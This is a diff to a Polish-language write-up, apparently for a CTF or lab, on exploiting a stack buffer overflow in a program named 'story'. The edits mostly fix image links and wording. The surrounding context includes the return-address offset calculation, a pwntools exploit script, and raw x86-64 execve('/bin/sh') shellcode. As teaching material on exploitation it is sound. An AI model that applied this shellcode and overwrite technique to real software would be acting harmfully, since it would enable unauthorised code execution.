@@ -102,13 +102,13 @@ b *0x555555554aab
 ```
 
 Możemy teraz urcuhomić program w gdb i podać puste hasło (1-Bajtowe haslo - sam znak nowej lini):
-!(imgs/gdb_beginning.png)
+![a](imgs/gdb_beginning.png)
 
-!(imgs/rax.png)
+![b](imgs/rax.png)
 
 Widzimy że przy wysłaniu pustego hasła program nadpisuje adres `0x7fffffffd632`.
 
-!(imgs/returning_from_foo.png)
+![c](imgs/returning_from_foo.png)
 
 Tutaj widać że adres powrotu znajduje się pod adresem: `0x7fffffffd678`
 
@@ -122,10 +122,10 @@ Out[1]: 70
 Trzeba wysłać password dłuższe o 70 znaków czyli sumarycznie 71 znaków. 
 Możemy sprawdzić w gdb czy obliczyliśmy wszystko poprawnie (wysyłamy 70 znaków `a` i znak nowej lini:
 
-!(imgs/p1.png)
+![p1](imgs/p1.png)
 Na powyższym obrazku widzimy że zapisuje adres na bufor `story` w miejsce które przechowuje adres powrotu.
 
-!(imgs/p2.png)
+![p2](imgs/p2.png)
 
 Po kontynuowaniu wykonywania programu w gdb widzimy że program wywalił się na próbie wykonywania instrukcji ze sterty, co oznacza że próbował wykonać instukcje z bufora `story`
 
@@ -178,7 +178,7 @@ commands = [
   "c"
 ]
 
-gdb.debug('story',gdbscript="\n".join(commands))
+gdb.debug('./story',gdbscript="\n".join(commands))
 
 def get_shellcode_execve():
     return "\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"
@@ -196,7 +196,5 @@ r.send(payload)
 r.interactive()
 ```
 
-Powinno to nam dodatkowo uruchomić dodatkowe okno z gdb. Musimy mieć na uwadze to, że jeśli uruchamiamy proces w gdb to on automatycznie wyłącza ASLRa i PIE.
-
-
+Powinno to nam dodatkowo uruchomić dodatkowe okno z gdb. Musimy mieć na uwadze to, że jeśli uruchamiamy proces w gdb to on automatycznie wyłącza ASLRa i PIE. W przeciwnym wypadku breakpoint na `0x555555554aab` nie zadziałałby
  
